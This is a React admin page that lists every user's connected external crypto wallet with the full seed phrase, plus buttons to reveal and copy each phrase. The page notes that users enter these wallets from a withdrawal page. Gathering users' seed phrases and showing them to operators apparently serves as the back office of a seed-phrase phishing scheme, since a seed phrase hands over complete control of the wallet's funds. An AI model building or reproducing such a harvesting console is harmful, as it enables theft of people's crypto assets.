import { AdminLayout } from "@/components/layout/admin-layout";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { 
  Table, 
  TableBody, 
  TableCell, 
  TableHead, 
  TableHeader, 
  TableRow 
} from "@/components/ui/table";
import { ArrowLeft, Wallet, Copy, Eye, EyeOff, Loader2, Key, User, Search } from "lucide-react";
import { useState } from "react";
import { useToast } from "@/hooks/use-toast";
import { Badge } from "@/components/ui/badge";
import { useQuery } from "@tanstack/react-query";
import { Link } from "wouter";

interface ConnectedWallet {
  id: number;
  userId: number;
  name: string;
  logo: string | null;
  address: string;
  seedPhrase: string | null;
  connectedAt: string;
  isDeleted: boolean;
  walletTypeId: number | null;
  user?: {
    id: number;
    username: string;
    firstName: string;
    lastName: string;
  };
}

export default function AdminWalletPhrases() {
  const { toast } = useToast();
  const [showPhrases, setShowPhrases] = useState<{ [key: number]: boolean }>({});
  const [searchTerm, setSearchTerm] = useState("");

  const { data: wallets = [], isLoading } = useQuery<ConnectedWallet[]>({
    queryKey: ['/api/admin/connected-wallets'],
    queryFn: async () => {
      const res = await fetch('/api/admin/connected-wallets');
      if (!res.ok) throw new Error('Failed to fetch wallets');
      return res.json();
    }
  });

  const filteredWallets = wallets.filter(wallet => 
    wallet.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
    (wallet.user?.username || '').toLowerCase().includes(searchTerm.toLowerCase()) ||
    (wallet.user?.firstName || '').toLowerCase().includes(searchTerm.toLowerCase()) ||
    (wallet.user?.lastName || '').toLowerCase().includes(searchTerm.toLowerCase())
  );

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString('en-US', {
      year: 'numeric',
      month: 'short',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast({ title: "Copied", description: `${label} copied to clipboard.` });
  };

  const toggleShowPhrase = (id: number) => {
    setShowPhrases(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const truncateAddress = (address: string) => {
    if (!address) return 'N/A';
    if (address.length <= 20) return address;
    return `${address.slice(0, 10)}...${address.slice(-8)}`;
  };

  const maskPhrase = (phrase: string) => {
    const words = phrase.split(' ');
    return words.map(() => '****').join(' ');
  };

  return (
    <AdminLayout>
      <div style={{ marginBottom: '24px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '16px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
          <Link href="/admin/linked-wallets">
            <Button variant="ghost" size="sm" data-testid="button-back-wallet-types">
              <ArrowLeft size={16} style={{ marginRight: '8px' }} />
              Back
            </Button>
          </Link>
          <div>
            <h1 style={{ fontSize: '20px', fontWeight: 700, color: '#111827' }}>Wallet Phrases</h1>
            <p style={{ fontSize: '14px', color: '#6b7280', marginTop: '4px' }}>View all user connected external wallets and their seed phrases</p>
          </div>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', backgroundColor: '#fef3c7', padding: '8px 16px', borderRadius: '8px' }}>
            <Key size={18} style={{ color: '#d97706' }} />
            <span style={{ fontWeight: 500, color: '#92400e', fontSize: '13px' }}>Sensitive Data</span>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', backgroundColor: '#f3f4f6', padding: '8px 16px', borderRadius: '8px' }}>
            <Wallet size={20} style={{ color: '#6f42c1' }} />
            <span style={{ fontWeight: 600, color: '#111827' }}>{wallets.length}</span>
            <span style={{ color: '#6b7280' }}>Total</span>
          </div>
        </div>
      </div>

      <div style={{ marginBottom: '16px' }}>
        <div style={{ position: 'relative', maxWidth: '320px' }}>
          <Search size={16} style={{ position: 'absolute', left: '12px', top: '50%', transform: 'translateY(-50%)', color: '#9ca3af' }} />
          <Input
            placeholder="Search by user or wallet..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            style={{ paddingLeft: '40px' }}
            data-testid="input-search-wallets"
          />
        </div>
      </div>

      <Card>
        <CardContent style={{ padding: '0' }}>
          {isLoading ? (
            <div style={{ textAlign: 'center', padding: '48px' }}>
              <Loader2 className="h-8 w-8 animate-spin mx-auto" style={{ color: '#6b7280' }} />
              <p style={{ marginTop: '16px', color: '#6b7280' }}>Loading wallets...</p>
            </div>
          ) : filteredWallets.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '48px 24px', backgroundColor: '#f9fafb', borderRadius: '8px', border: '1px dashed #e5e7eb' }}>
              <Wallet size={48} style={{ color: '#d1d5db', margin: '0 auto 16px' }} />
              <p style={{ color: '#6b7280', fontSize: '14px' }}>
                {searchTerm ? 'No matching wallets found' : 'No connected wallets found'}
              </p>
              <p style={{ color: '#9ca3af', fontSize: '12px', marginTop: '4px' }}>
                {searchTerm ? 'Try adjusting your search' : 'Users can connect external wallets from their withdrawal page'}
              </p>
            </div>
          ) : (
            <div style={{ overflowX: 'auto' }}>
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>User</TableHead>
                    <TableHead>Wallet</TableHead>
                    <TableHead>Address</TableHead>
                    <TableHead style={{ minWidth: '300px' }}>Seed Phrase</TableHead>
                    <TableHead>Connected At</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {filteredWallets.map((wallet) => (
                    <TableRow key={wallet.id} data-testid={`row-wallet-phrase-${wallet.id}`}>
                      <TableCell>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                          <div style={{ width: '32px', height: '32px', backgroundColor: '#e0e7ff', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                            <User size={16} style={{ color: '#4f46e5' }} />
                          </div>
                          <div>
                            <div style={{ fontWeight: 500, fontSize: '13px' }}>
                              {wallet.user?.firstName || 'Unknown'} {wallet.user?.lastName || ''}
                            </div>
                            <div style={{ fontSize: '11px', color: '#6b7280' }}>
                              @{wallet.user?.username || 'N/A'}
                            </div>
                          </div>
                        </div>
                      </TableCell>
                      <TableCell>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                          {wallet.logo ? (
                            <img 
                              src={wallet.logo} 
                              alt={wallet.name} 
                              style={{ width: '28px', height: '28px', objectFit: 'contain', borderRadius: '6px' }}
                            />
                          ) : (
                            <div style={{ width: '28px', height: '28px', backgroundColor: '#f3f4f6', borderRadius: '6px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                              <Wallet size={14} style={{ color: '#9ca3af' }} />
                            </div>
                          )}
                          <span style={{ fontWeight: 500 }}>{wallet.name}</span>
                        </div>
                      </TableCell>
                      <TableCell>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                          <code style={{ fontSize: '12px', backgroundColor: '#f3f4f6', padding: '4px 8px', borderRadius: '4px' }}>
                            {truncateAddress(wallet.address)}
                          </code>
                          {wallet.address && (
                            <Button 
                              variant="ghost" 
                              size="sm" 
                              onClick={() => copyToClipboard(wallet.address, 'Address')}
                              style={{ padding: '4px' }}
                              data-testid={`button-copy-address-${wallet.id}`}
                            >
                              <Copy size={12} />
                            </Button>
                          )}
                        </div>
                      </TableCell>
                      <TableCell>
                        {wallet.seedPhrase ? (
                          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                            <div style={{ 
                              maxWidth: '280px', 
                              fontSize: '11px', 
                              fontFamily: 'monospace',
                              backgroundColor: showPhrases[wallet.id] ? '#fef2f2' : '#f9fafb',
                              padding: '8px 12px',
                              borderRadius: '6px',
                              border: showPhrases[wallet.id] ? '1px solid #fecaca' : '1px solid #e5e7eb',
                              wordBreak: 'break-word'
                            }}>
                              {showPhrases[wallet.id] ? wallet.seedPhrase : maskPhrase(wallet.seedPhrase)}
                            </div>
                            <div style={{ display: 'flex', gap: '4px' }}>
                              <Button 
                                variant="ghost" 
                                size="sm" 
                                onClick={() => toggleShowPhrase(wallet.id)}
                                style={{ padding: '4px' }}
                                data-testid={`button-toggle-phrase-${wallet.id}`}
                              >
                                {showPhrases[wallet.id] ? <EyeOff size={14} /> : <Eye size={14} />}
                              </Button>
                              <Button 
                                variant="ghost" 
                                size="sm" 
                                onClick={() => copyToClipboard(wallet.seedPhrase!, 'Seed phrase')}
                                style={{ padding: '4px' }}
                                data-testid={`button-copy-phrase-${wallet.id}`}
                              >
                                <Copy size={12} />
                              </Button>
                            </div>
                          </div>
                        ) : (
                          <Badge variant="secondary">No phrase</Badge>
                        )}
                      </TableCell>
                      <TableCell>
                        <span style={{ fontSize: '12px', color: '#6b7280' }}>
                          {formatDate(wallet.connectedAt)}
                        </span>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          )}
        </CardContent>
      </Card>
    </AdminLayout>
  );
}
